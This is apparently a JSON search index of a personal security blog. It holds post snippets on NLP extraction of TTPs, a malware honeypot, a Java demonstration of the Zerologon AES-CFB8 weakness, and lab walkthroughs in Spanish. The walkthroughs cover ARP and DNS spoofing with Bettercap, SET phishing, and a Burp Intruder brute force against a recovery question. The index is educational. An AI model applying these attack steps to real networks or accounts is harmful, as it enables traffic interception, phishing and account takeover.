[ { "title": "Use of Natural Language Processing techniques for the automatic identification of TTPs in Threat Intelligence Reports.", "url": "/posts/TFM/", "categories": "Projects, Master's Thesis", "tags": "Natural Language Processing, Cyber Threat Intelligence, Tactics Techniques and Procedures, Indicator of Compromise, TRAM, MITRE", "date": "2022-09-18 06:37:00 +0200", "snippet": "In this post I present my Master’s Thesis to conclude my studies in the official master’s degree in Cybersecurity of the UAH.I take as a starting point the open source platform, developed by MITRE Corporation called TRAM (Threat Report ATT&amp;amp;CK Mapping), which is designed for the automatic extraction of TTPs from iberintelligence reports. The analysis performed on it yields a number of weaknesses on which this Master’s Thesis is going to focus.The code can be found in the following GitHub repository. Two videos (link to first video and link to second video) summarizing the functionalities of the project.Post index Abstract Introduction Objectives Results (Video demo) Results analysisAbstractThreat intelligence sharing has grown exponentially over the past few years. This has given cybersecurity professionals access to a vast amount of data to analyze. This discipline is known as cyber threat intelligence (CTI) which seeks to collect and organize information that can be used to prevent, detect or mitigate cyber attacks.Without the right tools, security analysts have to read and retrieve information from reports manually. Considering that the number of reports published daily has increased considerably, it is clear that this option is unfeasible, so the use of tools that automate the extraction of this information is necessary.After reviewing the state of the art, the open source platform developed by MITRE Corporation called TRAM (Threat Report ATT&amp;amp;CK Mapping), which is designed for the automatic extraction of TTPs from cyber intelligence reports, is taken as a starting point. The analysis carried out on it shows a series of weak points on which this Master’s Thesis will focus.We propose a set of new functionalities that, by crossing the extracted TTPs with data from public sources and the use of NLP techniques, generate conclusive data for the analyst. Specifically, these new features show the analyst a summary describing the threat present in the report, a top 3 of groups that could be involved in the attack, a visual representation of the chain of steps the threat follows to be exploited, a list with information on how to detect and mitigate the threat and, finally, the extraction of IoCs along with their validation in Alien-Vault to determine their criticality.With faster analysis, teams can more easily implement their countermeasures. While what has been developed in this TFM cannot and is not intended to replace a human analyst, it can help by providing them with some baseline data on the report.IntroductionIn a report1 published by Check Point Research, a leading provider of cybersecurity solutions worldwide, global statistics on the increases in cyberattacks are analyzed observed by region, country and sector during 2021. A 50% increase was detected over the previous year, 2020. the previous year, 2020.This is why it is increasingly important to evaluate the capacity for detection and rapid response to threats. For this purpose, a number of indicators are available that can be used to detect an adversary. The problem is that not all indicators are equally effective. This can be seen in what is known as “The Pyramid of Pain”2, which reflects the relationship between indicators versus the potential damage that denying those indicators can cause to attackers. In other words, the higher you are in the pyramid, the more effective our measures will be in creating a safe environment to create a hostile environment for the attacker.Figure 1 - Pyramid of painThreat information sharing has expanded over the past few years. This has led practitioners to have a wealth of data, including TTPs (Tactics, Techniques and Procedures), which as seen in the pain pyramid in Figure 1 are particularly valuable, but are usually found in unstructured reports, which makes it difficult to extract information automatically.This Master’s thesis aims to help cyber intelligence analysts by automatically extracting TTPs from reports using natural language processing techniques. With faster analysis, teams can implement their countermeasures more easily. While what has been developed in this project cannot and is not intended to replace a human analyst, it can help by providing them with some baseline data about the report.ObjectivesAlthough the final objective of this Master’s Thesis is the proposal of a system capable of extracting TTPs (Tactics, Techniques and Procedures) from cyberintelligence reports, this objective will be divided into a series of milestones necessary to achieve it. This objective will be divided into the series of milestones necessary to achieve it.The first milestone consists of the study and analysis of existing tools. Today there are several proposals, although with different approaches, that aim at extracting TTPs. This first phase is fundamental to know the mechanisms and methodologies applied up to the moment of the realization of this Master’s Thesis.In order to carry out information extraction in unstructured reports it is necessary to research Natural Language Processing or also known as NLP. The second milestone focuses on the study and analysis of this technique in order to understand its operation and how it works and to narrow the scope. After this, it is necessary to compile those procedures that can serve as a starting point for the resolution of the problem.In the third milestone, alternative methods to the use of Natural Language Processing (NLP) techniques for the extraction of TTPs from cyberintelligence reports are raised. The use of rules and pattern detection to recover vulnerabilities, use of cybersecurity ontologies, among others.Once the study and analysis phases have been completed, the fourth milestone begins, which focuses on the implementation of the improvements and proposals extracted from the previous phases.Finally, an analysis of the results is performed during which a report describing a real threat is chosen, imported into the tool, processed and studied to see if the generated output is appropiate.Results (Video demo)Demo with the functionalities of the applicationResults analysisThe following report3 is chosen for testing and checking the results. The report in question was written in 2013 and discusses the increased use of the malware called njRAT over several weeks.It presents, as a summary, the operation and objectives pursued by this malware to determine whether the results obtained in the tests are successful or not.What is it njRAT?njRAT, also called Bladabindi and Njw0rm, is a remote access Trojan used to remotely control infected machines. Due to the overabundance of online tutorials, the large amount of information and the robust set of evasion techniques implemented, njRAT has become one of the most widely used RATs in the world.This malware was first detected in 2013. The largest increase in attacks of the njRAT Trojan was recorded in 2014 in the Middle East, which is the region most targeted by this malware.It allows attackers to activate the webcam, record keystrokes and steal passwords. In addition, it gives access to the command line on the infected machine, thus allowing it to kill processes, as well as execute and manipulate files remotely. Finally, it is able to manipulate the system registry.How does it work?Once infected, the Trojan will collect various data about the PC on which it has been introduced, such as the computer name, operating system number, computer country, user names and operating system version.After infecting a computer, the malware uses a variable name and copies itself to %TEMP%, %APPDATA%, %USERPROFILE%, %ALLUSERSPROFILE% or %windir%. It can also copy itself to .exe, to make sure it will be activated every time the victim turns on his computer.It has some tricks to avoid being detected by antivirus. For example, it uses multiple .NET obfuscators to obscure its code. Another technique it uses is to camouflage itself in a critical process, which does not allow the user to shut it down. It can disable processes that belong to antivirus software, which allows it to remain hidden. It knows how to detect if it has been executed in a virtual machine, which helps attackers to set up countermeasures against researchers.The authors exploit Pastebin to avoid investigation by cybersecurity researchers, as it downloads additional components and executes second-stage payloads from Pastebin. Thus, the malware does not need to establish a traditional command and control (C2) server. Pastebin creates a pathway between njRAT infections and new payloads. With the Trojan acting as a downloader, it will take the encrypted data dumped into Pastebin, decode it and deploy it.For propagation, it can detect external hard drives connected via USB. Once the device is detected, the RAT will copy itself to the connected drive and create a shortcut.Analysis of resultsThe first feature to be analyzed is the summary and keywords. With this functionality, it is intended that the analyst has access to several types of summaries that conceptually allow him/her to understand what is described in the report. The summary is automatically extracted verbatim from the text, so there is nothing to analyze. However, it is possible to evaluate the accuracy of the keywords with which the analyst can get an idea of the type of malware he is dealing with. For example, in the case you are dealing with, njRAT is a remote access Trojan, which once it gains access to the target machine exfiltrates information through a command-and-control server. Such actions can be seen in both the verb-type keywords in Figure 2 and the application process-type keywords in Figure 3. It can be determined that the keywords used accurately describe the actions performed by a malware of these characteristics, so it can be concluded that the results are good.Figure 2 - Keywords njRAT 1Figure 3 - Keywords njRAT 2To evaluate the top 3 groups most likely to have carried out the attack based on the TTPs described, the main targets of njRAT must be taken into account.The summary shows that the peak of attacks occurred in 2014, when its targets were mostly aimed at the Middle East, although in reality it was a malware created for general use. In any case, Figure 4 shows whether any of the top 3 groups have Middle Eastern countries among their targets. Of these three groups, only the last one has Middle Eastern nations as its main target. Even so, and according to Wikipedia [68], the authorship is recognized to a group called M38dHhM, which is not present in the MITRE database, from which the groups are extracted for the realization of this top 3, so it is impossible to select it as a group present in the top 3.In many cases it is very difficult to determine which group has carried out the attack, and this is one of them, because the authorship is recognized to an alleged group of which there is no further evidence. This is why it is difficult to assess the accuracy of the results presented.Figure 4 - Possible perpetrator of the attackTo evaluate the accuracy of TTP prediction, and with it the display of TTPs in the MITRE matrix, we will check how many TTPs the system predicts autonomously and without manual review by an analyst. For this purpose, a report [69] from the eset company is used, which analyzes the malware and defines the set of TTPs used by the different versions of njRAT.This report presents a total of 30 TTPs, while the prediction made by TRAM only generates a total of 15, as shown in Figure 5. This is by no means a failure, since it should be borne in mind that the eset report includes the TTPs used by the different versions of the malware, which means that not all versions have to use all 30 TTPs. That said, the results presented by TRAM’s NLP-based system generate a more than acceptable prediction.Figure 5 - Cyber kill chainAs for the recommendation and detection system, the information shown only refers to the extracted TTPs, so its accuracy depends on how accurate the prediction process is. On the other hand, the information shown is correct, as it is compiled from MITRE itself. All in all, the results are good and allow the ana-list to have utilities at hand to detect and mitigate threats.Finally, the extraction of IoCs plus their validation. The main point is to recall what was explained in 2.2.2 The big problem of IoCs, where the lack of updates of the indicators of compromise and their short lifetime were mentioned, which made them unreliable.With this in mind, we chose one of the hundreds of IoCs extracted from the document and observed whether it had any relationship with the malware in question. As can be seen in Figure 6, the MD5 IoC shown has two pulses in AlienVault related to this malware.Figure 6 - MD5 IoCOn the other hand, the actions performed by the malware, described at the beginning of this section, are also taken into account for the evaluation. In this explanation, the paths that are normally used by the malware to carry out its actions are shown. In this case, an IoC is collected in which actions are seen both in the %appdata% directory, in Figure 7, and in the %temp% directory, in Figure 8.Figure 7 - IoC 1Figure 8 - IoC 2It is observed that both the extraction of IoCs and their validation generate good results by showing information that is in line with that described in the malware report.In short, it is concluded that the functionalities developed do produce an improvement in the tool, as they provide additional information that can be of great use to analysts.Reverse Footnote Check Point Research: Cyber Attacks Increased 50% Year over Year [Accessed at: 06-2022] &amp;#8617; The pyramid of pain [Accessed at: 07-2022] &amp;#8617; Fidelis Threat Advisory #1009 - “njRAT”[Accessed at: 07-2022] &amp;#8617; " }, { "title": "Obtaining malware samples using Honeypots", "url": "/posts/malware-honeypot/", "categories": "Cybersecurity, Malware Analysis", "tags": "Malware, Honeypot, Ssdeep, Yara, Dionaea, DarkComet, WannaCry, Docker, DigitalOcean", "date": "2022-03-21 13:53:00 +0100", "snippet": "This post presents a solution to capture a sample of malicious binaries distributed over the Internet.Post index Honeypot construction Honeypot analysisHoneypot constructionIt has been decided to develop a low interaction honeypot, specifically we have decided to use the honeypot “Dionaea”, which enables the following protocols and simulates their services: blackhole, epmap, ftp,http, memcache, mirror, mqtt, mssql, mysql, pptp, sip, smb, tftp, upnp.The “Digital Ocean” service has been used to set up this honeypot. We created a virtual machine with Ubuntu operating system, 2GB of RAM, 1 CPU and 50GB of hard disk.Figure 1 - Digital Ocean.We enable the connection via SSH connection. We connect to the machine with the credentials.Figure 2 - Digital Ocean connection.There is an image of the Dionaea honeypot in docker. Before performing these steps it was necessary to install necessary to install packages that the machine needed. We created a container with the Dionaea image.Figure 3 - Dionaea.To check that everything has been deployed correctly, we can verify this by seeing if the dionaea image has been downloaded to our machine and if there is a container running the image. In this case, we check the ports and services that the container has active. We can also see which ports our machine has active. Here you can also see also the ones opened by the container with the dionaea image.Figure 4 - Dionaea 2.Once we have checked that the services are up correctly, we are going to see if the folder structure has been created correctly. The folders we are interested in are the ones marked in Figure 5.Figure 5 - Folders that we are interested.We left the machine up for a few days to gather information.Honeypot analysisWe can see how as the hours go by the disk usage of the virtual machine increases. increases its usage.Figure 6 - Disk usage.The same can be seen on the connections side, we see activity from bots trying to distribute malware.Figure 7 - Bandwidth usage.After waiting a couple of days, we found all these binaries.Figure 8 - Binares found.If we check the file type of all the binaries we have:Figure 9 - Type of binares found.We use ssdeep as a non-cryptographic hash to determine if there are matches between the different files. Marked in yellow and green we can see binaries that appear to be from the same binaries that appear to be from the same family but with small variations in the code.Figure 10 - Using ssdeep to obtain families and variations.Another additional step to the previous one would be to pass “clamscan” to analyze if these binaries are malicious and to determine which family they belong to.Figure 11 - Using clamscan to analyze the binaries.The results of the analysis show that there are a large number of binaries made with the Wannacry Ransomware.Figure 12 - Family of binariesAfter collecting malware binaries, we will proceed to analyze one of them. This will be discussed in future posts." }, { "title": "Zerologon Vulnerability Implementation", "url": "/posts/vulnerability-zerologon/", "categories": "Cybersecurity, Vulnerability Analytics", "tags": "Vulnerability, Zerologon, Cryptography, CVE-2020-1472", "date": "2022-02-15 11:12:00 +0100", "snippet": "In this post I intend to implement the vulnerability known as Zerologon that allows an attacker to gain full control over a domain server in the Active Directory domain server.The vulnerability acts within the scope of the Netlogon protocol, used in Windows domain servers to, among other things, facilitate access to users who want to log in to the server using an account and password.Post index Introduction How to reproduce it ? Results Conclusions Code developedIntroductionThe attack described here1 takes advantage of flaws in a cryptographic authentication protocol that proves the authenticity and identity of a domain-joined computer to the DC. Due to incorrect use of an AES mode of operation it is possible to spoof the identity of any computer account (including that of the DC itself) and set an empty password for that account in the domain.To carry out this project, I read the detailed indications in the report1 and through it I determine the steps I must follow to exploit the vulnerability.In this case, I’m not going to specify how it works, but rather how to create the code to exploit the vulnerability. If you want to understand why it works, read the report1 where it is detailed.What must be implemented to exploit the vulnerability is what you see in the following image (Figure 1).Figure 1 - When encrypting a message consisting only of zeroes, with an all-zero IV, there is a 1 in 256 chance that the output will only contain zeroes as well.How to reproduce it ?To ensure that the cryptogram is made up exclusively of zeros, the following must be taken into account: IV → All zeros. Message → All zeros. Key → Since the length of the key is 8 bits, there are 2^8 = 256 combinations of keys. Some one of the 256 combinations will generate as output a zero. This will cause the cryptogram to be zeros.We are going to comment the most important parts (All the code is attached at the end of the post to be able to see it complete and execute it): Initialization: We start with the requirements stipulated in Figure 1 and the CFB8 block cipher mode.Figure 2 - Initialization proccess. Encryption and decryption functions: they receive the message or cryptogram, followed by the key and the IV.Figure 3 - Encryption and decryption functions. Brute force to obtain the cryptogram we want: for each attempt, a key is randomly generated. We check if the cryptogram generated with the generated cryptogram is all zeros. Finally, a series of statistics are printed to see if any cryptogram is equal to zero and the position of the attempt. equal to zero and the position of the attempt.Figure 4 - Brute force to obtain the cryptogram we want:. Random string generation function.Figure 5 - Random string generation function. ResultsOne of the executions generates a match among 256 attempts made, see it in Figure 6.Figure 6 - Results 1If we go to position 77, as shown in the previous image, we can see that the cryptogram is all zeros.Figure 7 - Results 2But that will not always be the case. There will be times when the number of matches is zero. This is because the random string generation function is not as random as it seems and does not generate all possible combinations.Figure 8 - Results 3On the other hand, there will be occasions when the opposite is true. In this case there are two coincidences.Figure 9 - Results 4ConclusionsBy simply sending a number of Netlogon messages in which various fields are filled with zeroes, an attacker can change the computer password of the domain controller that is stored in the AD. This can then be used to obtain domain admin credentials and then restore the original DC password.Code developedHere you have the code developed to exploit CVE-2020-1472 vulnerability.import java.io.UnsupportedEncodingException;import java.nio.charset.Charset;import java.security.InvalidAlgorithmParameterException;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;import java.security.SecureRandom;import java.util.ArrayList;import java.util.List;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.KeyGenerator;import javax.crypto.NoSuchPaddingException;import javax.crypto.SecretKey;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import jakarta.xml.bind.DatatypeConverter;public class Cryptor { private Cipher cipher; static int numIntentos = 256; static byte[] iv = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; static byte[] text = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; private static Charset CHARSET = Charset.forName(&quot;ISO-8859-1&quot;); public Cryptor() throws CryptingException { try { cipher = Cipher.getInstance(&quot;AES/CFB8/NoPadding&quot;); } catch (NoSuchAlgorithmException e) { throw new SecurityException(e); } catch (NoSuchPaddingException e) { throw new SecurityException(e); } } public byte[] decrypt(byte[] input, SecretKey keySpec, IvParameterSpec ivSpec) throws CryptingException { try { cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec); return cipher.doFinal(input); } catch (IllegalBlockSizeException e) { throw new SecurityException(e); } catch (BadPaddingException e) { throw new SecurityException(e); } catch (InvalidKeyException e) { throw new SecurityException(e); } catch (InvalidAlgorithmParameterException e) { throw new SecurityException(e); } } public byte[] encrypt(byte[] input, SecretKey keySpec, IvParameterSpec ivSpec) throws CryptingException { try { cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec); return cipher.doFinal(input); } catch (InvalidKeyException e) { throw new SecurityException(e); } catch (InvalidAlgorithmParameterException e) { throw new SecurityException(e); } catch (IllegalBlockSizeException e) { throw new SecurityException(e); } catch (BadPaddingException e) { throw new SecurityException(e); } } public static void main(String Args[]) throws UnsupportedEncodingException { try { Cryptor c = new Cryptor(); int cont = 0; List&amp;lt;String&amp;gt; posiciones = new ArrayList&amp;lt;String&amp;gt;(); for (int i = 0; i &amp;lt; Cryptor.numIntentos; i++) { System.out.println(&quot;Posicion: &quot; + i); System.out.println(&quot;TEXT -&amp;gt; 0x&quot; + DatatypeConverter.printHexBinary(text)); // KEY String secretKey = generateRandomString(16); System.out.println(&quot;KEY -&amp;gt; &quot; + secretKey); SecretKey keySpec = new SecretKeySpec(secretKey.getBytes(CHARSET), &quot;AES&quot;); // IV System.out.println(&quot;IV -&amp;gt; 0x&quot; + DatatypeConverter.printHexBinary(Cryptor.iv)); IvParameterSpec ivSpec = new IvParameterSpec(Cryptor.iv); // ENCRYPT byte[] encrypted = c.encrypt(Cryptor.text, keySpec, ivSpec); if (DatatypeConverter.printHexBinary(encrypted).contains(&quot;00000000000000000000000000000000&quot;)) { System.out.println(&quot;Encoded -&amp;gt; 0x&quot; + DatatypeConverter.printHexBinary(encrypted) + &quot; &amp;lt;--------------- ####### UN RESULTADO #######&quot;); cont++; posiciones.add(Integer.toString(i)); } else System.out.println(&quot;Encoded -&amp;gt; 0x&quot; + DatatypeConverter.printHexBinary(encrypted)); //DECRYPT byte[] decrypted = c.decrypt(encrypted, keySpec, ivSpec); System.out.println(&quot;Decoded -&amp;gt; 0x&quot; + DatatypeConverter.printHexBinary(decrypted)); System.out.println(&quot;------------------------------------&quot;); } System.out.println(&quot;####### RESULTADOS #######&quot;); System.out.println(&quot;Numero intentos -&amp;gt; &quot; + Cryptor.numIntentos); System.out.println(&quot;Coincidencias -&amp;gt; &quot; + cont); System.out.println(&quot;En las posiciones -&amp;gt; &quot; + posiciones); } catch (CryptingException e) { e.printStackTrace(); } } public static String generateRandomString(int length) { String CHAR_LOWER = &quot;abcdefghijklmnopqrstuvwxyz&quot;; String CHAR_UPPER = CHAR_LOWER.toUpperCase(); String NUMBER = &quot;0123456789&quot;; String DATA_FOR_RANDOM_STRING = CHAR_LOWER + CHAR_UPPER + NUMBER; SecureRandom random = new SecureRandom(); if (length &amp;lt; 1) throw new IllegalArgumentException(); StringBuilder sb = new StringBuilder(length); for (int i = 0; i &amp;lt; length; i++) { int rndCharAt = random.nextInt(DATA_FOR_RANDOM_STRING.length()); char rndChar = DATA_FOR_RANDOM_STRING.charAt(rndCharAt); sb.append(rndChar); } return sb.toString(); } class CryptingException extends RuntimeException { private static final long serialVersionUID = 7123322995084333687L; public CryptingException() { super(); } public CryptingException(String message) { super(message); } }}Reverse Footnote Zerologon: Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) by Tom Tervoort, September 2020 WHITEPAPER [Accessed at: 02-2022] &amp;#8617; &amp;#8617;2 &amp;#8617;3 " }, { "title": "Explotación de vulnerabilidades en Red", "url": "/posts/seg-ofensiva-explotacion-vuln-red/", "categories": "Ciberseguridad, Seguridad Ofensiva", "tags": "Pentesting, Bettercap, ARPspoofing, DNSspoofing, SET", "date": "2021-07-13 13:35:00 +0200", "snippet": "Durante los posts anteriores hemos visto métodos para recopilar y analizar información sobre nuestros objetivos. Durante este post veremos como explotar (en Red) aquellas vulnerabilidades que presentan.Contenido Man In The Middle (MITM) ARP Spoofing Caso de uso DNS Spoofing Caso de uso Social Engineering Toolkit (SET) Caso de uso Man In The Middle (MITM)Es un ataque en el que se adquiere la capacidad de leer, insertar y modificar a voluntad. El atacante debe ser capaz de observar e interceptar mensajes entre las dos víctimas y procurar que ninguna de las víctimas conozca que el enlace entre ellos ha sido violado.Esquema MITMARP SpoofingLa suplantación de ARP (en inglés ARP spoofing) es enviar mensajes ARP falsos a la Ethernet. Normalmente la finalidad es asociar la dirección MAC del atacante con la dirección IP de otro nodo (el nodo atacado), como por ejemplo la puerta de enlace predeterminada. Cualquier tráfico dirigido a la dirección IP de ese nodo, será erróneamente enviado al atacante, en lugar de a su destino real. El atacante, puede entonces elegir, entre reenviar el tráfico a la puerta de enlace predeterminada real (ataque pasivo o escucha), o modificar los datos antes de reenviarlos (ataque activo).Caso de usoVamos a envenenar la tabla ARP de la máquina objetivo (ip 192.168.216.129) para que el tráfico no pase directamente por la puerta de enlace predeterminada (el router, con ip 192.168.216.2), sino que pase por nuestra máquina (192.168.216.128). En la siguiente imagen podemos ver cual es el estado del que se parte y el estado al que se quiere llegar.Estado anterior y posterior al MITMAntes de realizar el ataque, vamos a comprobar una serie de cosas en la máquina Windows: Comprobamos cual es la IP de la máquina Windows y vemos cual es el contenido de la tabla ARP que tiene almacenada en caché. Podemos ver que la máquina Kali y el gateway tienen direcciones MAC distintas.Tabla ARP de la máquina Windows (la objetivo) Ejecutamos un traceroute para observar las rutas que toma la máquina. En este caso podemos ver que el primer salto que realiza la máquina Windows es contra el gateway (192.168.216.2).Traceroute (antes del MITM) desde la máquina Windows Visto el estado anterior al ataque MITM. Ahora nos desplazamos a la máquina Kali. En ella vamos a usar la herramienta Bettercap para realizar el ataque de envenenamiento. Los pasos a seguir son: Ejecutamos la herramienta con permisos de administrador. Indicamos los objetivos del ataque de envenenamiento, en nuestro caso sobre la máquina Windows (192.168.216.129). Lanzamos el ataque mediante el comando “arp.spoof on”. Colocamos un sniffer, en este caso wireshark, para comprobar el tráfico que se genera tras la ejecución del ataque.Ejecución del ataque MITM mediante BettercapEn la captura anterior podemos extraer mucha información, vamos a analizarla.En la esquina inferior derecha tenemos una consola donde hemos ejecutado la herramienta Bettercap con lo comentado anteriormente. Hemos colocado como objetivo la máquina windows (192.168.216.129) y posteriormente hemos lanzado el ataque. Esto a generado, como se puede ver en wireshark, una inundación de paquetes ARP desde la máquina kali (MAC 00:0c:29:a7:95:6b) hacía la máquina Windows (MAC 00:0c:29:d9:4b:01). El contenido de ese mensaje es el siguiente: “192.168.216.2 is at 00:0c:29:a7:95:6b”. En esto consiste el envenenamiento, en hacerle pensar a la máquina objetivo que eres el router o gateway (que se encuentra en 192.168.216.2).Por último, para comprobar si el ataque ha sido exitoso, volvemos a la máquina Windows para hacer algunas comprobaciones.Comprobamos el contenido de la tabla ARP que tiene en caché y vemos que la máquina Kali ahora comparte la dirección MAC con el gateway de la red.Si ejecutamos un traceroute, podemos observar que el primer salto que realiza la máquina Windows es contra la máquina del atacante, y después es redireccionado al gateway.Tabla ARP + Traceroute (después del MITM) desde la máquina WindowsDNS SpoofingLa suplantación de DNS, también conocida como envenenamiento de la caché de DNS, es una forma de piratería informática en la que se introducen datos corruptos del Sistema de Nombres de Dominio en la caché del resolvedor de DNS, haciendo que el servidor de nombres devuelva un registro de resultados incorrecto, por ejemplo, una dirección IP. Esto hace que el tráfico se desvíe al ordenador del atacante (o a cualquier otro ordenador)Caso de usoCon el ARP Spoofing que hicimos antes conseguimos estar entre medias de la comunicación, pero no sacamos ningún uso a esta ventaja. Ahora lo que haremos será crear una web falsa que sea devuelta cuando el usuario objetivo quiera entrar en la web de facebook.Para ello, debemos volver a realizar ARP Spoofing. En la siguiente imagen podemos comprobar la ruta que se sigue desde el ordenador objetivo cuando realiza una petición DNS de google. Vemos que antes de pasar por el router pasa por el ordenador del atacante.Tabla ARP + Traceroute desde la máquina WindowsEn la máquina del atacante configuramos el ataque de DNS Spoofing. Para ello, indicamos que se haga uso del módulo dns.spoof, asignándole como ruta facebook.es y la dirección de nuestra máquina atacante 192.168.239.129, donde tendremos un servidor apache levantado con una web muy básica que contendrá el siguiente contenido Visitando la página web del atacante.Uso de Bettercap para DNS spoofingLanzamos el módulo. Vemos que la dirección de facebook queda asociada a la ip del atacante.Uso de Bettercap para DNS spoofingAccedemos a la máquina objetivo, usando un navegador visitamos la página de facebook. Como se puede comprobar, devuelve la página alojada en la máquina atacante.Navegando a Facebook desde la máquina objetivoSocial Engineering Toolkit (SET)SET es una completísima suite dedicada a la ingeniería social , que nos permite automatizar tareas que van desde el de envío de SMS (mensajes de texto) falsos, con los que podemos suplantar el numero telefónico que envía el mensaje, a clonar cualquier pagina web y poner en marcha un servidor para hacer phishing en cuestión de segundos.El kit de herramientas SET está especialmente diseñado para realizar ataques avanzados contra el elemento humano. Originalmente, este instrumento fue diseñado para ser publicado con el lanzamiento de http://www.social-engineer.org y rápidamente se ha convertido en una herramienta estándar en el arsenal de los pentesters.Caso de usoSería realizar el mismo procedimiento que en el caso de uso del apartado de DNS Spoofing, con la diferencia de clonar el login de facebook. Esto se haría por medio de la Social Engineering Toolkit." }, { "title": "Explotación de vulnerabilidades en Web", "url": "/posts/seg-ofensiva-explotacion-vuln-web/", "categories": "Ciberseguridad, Seguridad Ofensiva", "tags": "Pentesting, Mutillidae, BurpSuite, Skipfish, SQLi, SQLmap, PathTraversal, WebShell, XSS, XSStrike", "date": "2021-07-10 11:35:00 +0200", "snippet": "Durante los posts anteriores hemos visto métodos para recopilar y analizar información sobre nuestros objetivos. Durante este post veremos como explotar (en Web) aquellas vulnerabilidades que presentan.Contenido Preparación de una aplicación web vulnerable: Mutillidae ¿Qué es Mutillidae? Instalación Burp Suite Proxy de interceptación de tráfico de navegación Caso de uso Spider para el descubrimiento e indexación de contenido Inyección de código SQL Injection (SQLi) Tipos de SQLi SQLmap Caso de uso Path Traversal Caso de uso WebShells Caso de uso Unrestricted File Upload Caso de uso HTML Injection y Cross-Site-Scripting (XSS) Caso de uso Cross-site request forgery (CSRF) Caso de uso XSStrike (Automatización de ataques XSS) Caso de uso Preparación de una aplicación web vulnerable: Mutillidae¿Qué es Mutillidae?OWASP Mutillidae II es una aplicación web libre, open source, deliberadamente vulnerable, la cual proporciona un objetivo para entusiastas en seguridad web. Mutillidae puede ser instalado sobre Linux y Window utilizando LAMP, WAMP, y XAMMP. Incluye docenas de vulnerabilidades y sugerencias para ayudar al usuario. Es un entorno para hacking web fácil de utilizar, diseñado para laboratorios, entusiastas de seguridad, salones de clase, CTF, y herramientas para la evaluación de vulnerabilidades. Mutillidae ha sido utilizado en cursos de seguridad, cursos de entrenamiento para empresas, y como objetivo para evaluar diverso software de seguridad.Captura de la página principal de MutillidaeInstalaciónSeguir los pasos detallados en github mutillidae.Burp SuitePlataforma de auditoría web la cual incorpora un potente grupo de herramientas que nos permiten realizar desde la búsqueda de vulnerabilidades hasta las pruebas de explotación de las mismas.Incorpora los siguientes módulos: Proxy de interceptación de tráfico de navegación, tanto HTTP como HTTPS. Spider para el descubrimiento e indexación de contenido. Escáner de aplicaciones web. Herramientas avanzadas de Fuzzing. Análisis de sesiones. Soporte para plugins.Es una de las herramientas más potentes de auditorias web que se pueden encontrar, pero aunque disponga de una versión gratuita (Community Edition) en ella no se incluyen muchas de las funcionalidades que incorporan las versiones de pago (Enterprise o Proffesional), por lo que si queremos obtener buenos resultados no nos queda más remedio que comprar su licencia.Proxy de interceptación de tráfico de navegaciónComo función principal de BurpSuite, el módulo Proxy intercepta el servidor proxy HTTP/S y actúa como intermediario entre el navegador y la aplicación de destino, lo que le permite interceptar, ver y modificar el flujo de datos original en ambas direcciones.Diseñado para pruebas de penetración, permite encontrar y explorar las vulnerabilidades de la aplicación al monitorear y manipular los parámetros clave y otros datos transmitidos por la aplicación.Caso de usoSupongamos que queremos interceptar una petición de recuperación de contraseñas. Para recuperar la contraseña, además del email del usuario, se nos pregunta por el color preferido del usuario. Antes de proceder con el ataque debemos configurar un par de cosas.Para que Burp Suite intercepte las peticiones es necesario configurar el navegador para que dirija todo el tráfico al puerto donde esté el proxy a la escucha. A la hora de ejecutar el módulo proxy de BurpSuite nos indicará en que puerto se encuentra alojado. En este caso, el sevicio está corriendo en el puerto 8080. En el navegador configuramos para que haga uso del proxy alojado en localhost:8080.Configurando uso de proxy en el navegadorUna vez configurado, si navegamos por la web podemos ver que esta se queda en espera (cargando), esto se debe a que hemos capturado la petición y hasta que no digamos lo contrario seguirá en espera. De esta forma podemos capturar las peticiones que hacemos contra la web.Configurando uso de proxy en el navegadorComo los colores son finitos, podemos realizar un ataque por diccionario para recuperar la contraseña del usuario objetivo. Burpsuite dispone de una herramienta que permite realizar estas acciones, el módulo intruder. Dada una petición interceptada, te permite seleccionar qué parámetros quieres que usen un diccionario. En este caso, queremos que el parametro ‘color’ use un diccionario, de esta forma iteraremos sobre todos los posibles colores hasta encontrar el correcto.Ataque diccionario con módulo intruder BurpSuiteSi lanzamos el ataque, se envía una petición por cada elemento que se encuentre en el diccionario. Cuando se introduce mal el color, el servidor devuelve la misma página de error siempre. Podemos observar que para el color ‘green’ la respuesta del servidor tiene una longitud distinta el resto. Esto quiere decir que hemos encontrado el color con el que recuperar la cuenta de dicho usuario.Resultado ataque diccionario con módulo intruder BurpSuiteSpider para el descubrimiento e indexación de contenidoBurp Suite realiza un escaneo pasivo o activo para el descubrimiento del contenido de la aplicación web objetivo.Para el escaneo pasivo, tendremos que acceder a la pestaña target -&amp;gt; site map. Podemos observar que a la izquierda presenta una lista con una única ip. Esa ip es la de la web objetivo. Si desplegamos la ip, vemos el nombre que presenta la aplicación web. Dentro de esta vemos una sección index.php que presenta todas las rutas que Burp Suite ha sido capaz de descubrir de manera pasiva. Las que aparecen en negro son aquellas rutas que ya hemos visitado.Escaneo pasivo en burp suiteSi queremos realizar un escaneo activo, tendremos que acceder a la pestaña dashboard. Pinchamos sobre la acción de New live task y podemos observar que el escaneo activo no está presenta en la versión gratuita de Burp Suite (En la version 1.X si que lo estaba). Por esta razón, si queremos realizar un escaneo activo, debemos comprar la licencia o usar otras herramientas que nos permitan realizarlo de manera gratuita.Escaneo activo en burp suiteVamos a usar la herramienta gratuita skipfish para realizar el escaneo activo.Para ello, ejecutamos el comando skipfish -YO -o &amp;lt;ruta_salida_informe&amp;gt; &amp;lt;ruta_web&amp;gt; en nuestro caso la es http://192.168.16.133/mutillidae/index.php.Escaneo activo con skipfishPara finalizar el escaneo (puede llevar horas) podemos hacer ctrl+c. Esto generará un informe .html en la . En este informe podemos encontrar todo tipo de información, desde tipos de archivos que haya encontrado hasta vulnerabilidades.Informe escaneo skipfishInyección de códigoEste tipo de ataques tienen como objetivo lograr la ejecución de comandos dentro del sistema 